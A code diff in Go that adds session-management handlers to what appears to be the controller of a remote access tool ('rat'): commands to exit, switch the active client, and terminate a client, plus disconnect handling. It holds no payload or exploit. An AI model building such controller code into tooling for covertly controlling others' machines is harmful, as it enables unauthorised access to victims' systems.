@@ -62,6 +62,19 @@ func NewRAT(logger utility.LogQue) RAT {
 	}
 
 	// Add command handlers and packet handlers.
+	rat.cmdHandlers["exit"] = func([]string) error {
+		return io.EOF
+	}
+
+	rat.cmdHandlers["sw"] = rat.switchClient
+
+	rat.cmdHandlers["off"] = rat.terminateClient
+
+	rat.netHandlers[Connect] = func(network.Client, *network.Packet) error {
+		return nil
+	}
+
+	rat.netHandlers[Disconnect] = rat.onDisconnect
 
 	if err := rat.Register(rat); err != nil {
 		logger.Panic(err)
@@ -254,4 +267,48 @@ func (rat *rat) getSocket(id interface{}) (*socket, error) {
 	}
 
 	return socket, nil
+}
+
+// ------ Command Handlers ------
+
+func (rat *rat) switchClient(args []string) error {
+	if len(args) == 0 {
+		return fmt.Errorf("Null argument")
+	}
+
+	socket, err := rat.getSocket(args[0])
+	if err != nil {
+		return err
+	}
+
+	rat.SetClient(socket.client)
+	rat.Log(fmt.Sprintf("The current client has changed to [%v].", rat.currClient.ID()))
+	return nil
+}
+
+func (rat *rat) terminateClient(args []string) error {
+	if len(args) == 0 {
+		return fmt.Errorf("Null argument")
+	}
+
+	socket, err := rat.getSocket(args[0])
+	if err != nil {
+		return err
+	}
+
+	return rat.onDisconnect(socket.client, nil)
+}
+
+// ------ Packet Handlers ------
+
+func (rat *rat) onDisconnect(client network.Client, packet *network.Packet) error {
+	utility.Assert(client != nil, "Null argument.")
+
+	id := client.ID()
+	if rat.sockets.Del(id) {
+		rat.Store(fmt.Sprintf("The client [%v] has disconnected.", id))
+		return nil
+	}
+
+	return fmt.Errorf("Invalid client ID: %v", id)
 }
